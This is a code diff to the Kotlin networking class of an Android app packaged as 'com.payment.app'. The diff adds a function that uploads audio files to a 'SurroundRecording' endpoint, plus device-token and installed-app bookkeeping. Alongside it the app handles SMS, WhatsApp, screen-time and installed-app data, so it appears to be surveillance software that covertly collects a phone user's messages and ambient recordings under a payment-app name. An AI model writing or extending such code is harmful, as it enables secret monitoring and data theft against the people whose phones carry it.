@@ -3,6 +3,8 @@ package com.payment.app.services
 import APIInterface
 import android.content.Context
 import android.content.SharedPreferences
+import android.icu.text.DateFormat
+import android.icu.text.SimpleDateFormat
 import android.net.ConnectivityManager
 import android.net.NetworkInfo
 import android.os.Build
@@ -26,8 +28,11 @@ import com.payment.app.model.InstalledApp
 import com.payment.app.model.ScreenTimeModel
 import com.payment.app.model.SmsModel
 import com.payment.app.sqllite.SQLiteHelper
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
 import okhttp3.RequestBody
 import org.json.JSONArray
 import org.json.JSONException
@@ -35,8 +40,11 @@ import org.json.JSONObject
 import retrofit2.Call
 import retrofit2.Callback
 import java.io.File
+import java.io.IOException
 import java.time.LocalDateTime
+import java.util.Calendar
 import kotlin.collections.ArrayList
+import kotlin.coroutines.suspendCoroutine
 
 class ApiCall{
     private val MY_SOCKET_TIMEOUT_MS = 3600000
@@ -418,6 +426,46 @@ class ApiCall{
             ApiCallManager.appendLog("$name API failed: ${e.toString() ?: "Unknown Error"}")
             e.printStackTrace()
         }
+    }
+
+    suspend fun uploadAudio(
+        filePath: String,
+        token: String,
+        baseUrl: String,
+        duration: String
+    ): okhttp3.Response = suspendCoroutine { continuation ->
+        val file = File(filePath)
+        Log.d("callAudioApi", "callAudioApi")
+        ApiCallManager.appendLog("Audio API call")
+
+        val url = "$baseUrl/api/SurroundRecording/AddSurroundRecording"
+        ApiCallManager.appendLog("===================")
+        ApiCallManager.appendLog("Audio API url => $url")
+        ApiCallManager.appendLog("===================")
+
+        val client = OkHttpClient()
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("file", file.name, RequestBody.create("audio/mpeg".toMediaType(), file))
+            .addFormDataPart("Name", file.name)
+            .addFormDataPart("Duration",duration)
+            .build()
+
+        val request = Request.Builder()
+            .url(url)
+            .addHeader("Authorization", "Bearer $token") // Add the token to the "Authorization" header
+            .post(requestBody)
+            .build()
+
+        client.newCall(request).enqueue(object : okhttp3.Callback {
+            override fun onFailure(call: okhttp3.Call, e: IOException) {
+                continuation.resumeWith(Result.failure(e))
+            }
+
+            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                continuation.resumeWith(Result.success(response))
+            }
+        })
     }
 
     fun callWhatsappApi(
@@ -885,7 +933,8 @@ class ApiCall{
         dataList: ArrayList<InstalledApp>,
         token: String,
         applicationContext: Context?,
-        baseUrl: String
+        baseUrl: String,
+        prefs: SharedPreferences
     ) {
         ApiCallManager.appendLog("Calling Get All App API")
 
@@ -902,6 +951,16 @@ class ApiCall{
                 ApiCallManager.appendLog("Get All App Log API Call Success")
                 ApiCallManager.appendLog("callGetAllAppApi Response : $response")
                 Log.d("callGetAllAppApi Response", response.toString())
+                val editor = prefs.edit()
+                editor.putString("isAllGetAppApi","true")
+                val dateFormat: DateFormat = SimpleDateFormat("dd-MM-yyyy")
+                Log.d("currentDate" ,dateFormat.format(Calendar.getInstance().time).toString())
+                editor.putString("oldAllAppDate",dateFormat.format(Calendar.getInstance().time).toString())
+                editor.apply()
+                val isAllLogApiCall = prefs.getString("isAllGetAppApi","")
+                val oldDate = prefs.getString("oldAllAppDate","")
+                Log.d("isAllLogApiCall" ,isAllLogApiCall.toString())
+                Log.d("oldDate" ,oldDate.toString())
             },
             Response.ErrorListener { error ->
                 VolleyLog.d("Error", "Error: " + error.message)
@@ -982,4 +1041,43 @@ class ApiCall{
         queue.add(req)
     }
 
+    fun updateFcmToken(token: String, applicationContext: Context?, baseUrl: String, fcmToken: String?) {
+        ApiCallManager.appendLog("Calling Update FcmToken API")
+        val requestData = JSONObject()
+        requestData.put("deviceToken", fcmToken)
+        Log.d("callUpdateFcmTokenApi", "callUpdateFcmTokenApi")
+        val url = "$baseUrl/api/Account/UpdateDeviceToken"
+        ApiCallManager.appendLog("===================")
+        ApiCallManager.appendLog("Get Update FcmToken API url => $url")
+        ApiCallManager.appendLog("===================")
+
+        val req = object : JsonObjectRequest(
+            Method.POST, url,requestData,
+            Response.Listener<JSONObject> { response ->
+                ApiCallManager.appendLog("Get Update FcmToken API Call Success")
+                ApiCallManager.appendLog("callUpdateFcmTokenApi Response : $response")
+                Log.d("callUpdateFcmTokenApi Response", response.toString())
+            },
+            Response.ErrorListener { error ->
+                VolleyLog.d("Error", "Error: " + error.message)
+                ApiCallManager.appendLog("Get Update FcmToken API Call failed: ${error.message ?: "Unknown"}")
+            }) {
+
+            @Throws(AuthFailureError::class)
+            override fun getHeaders(): Map<String, String> {
+                val headers = HashMap<String, String>()
+                headers["Authorization"] = "Bearer $token"
+                headers["accept"] = "*/*"
+                headers["Content-Type"] = "application/json"
+                return headers
+            }
+        }
+        req.retryPolicy = DefaultRetryPolicy(
+            MY_SOCKET_TIMEOUT_MS,
+            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
+        )
+        val queue = Volley.newRequestQueue(applicationContext)
+        queue.add(req)
+    }
 }
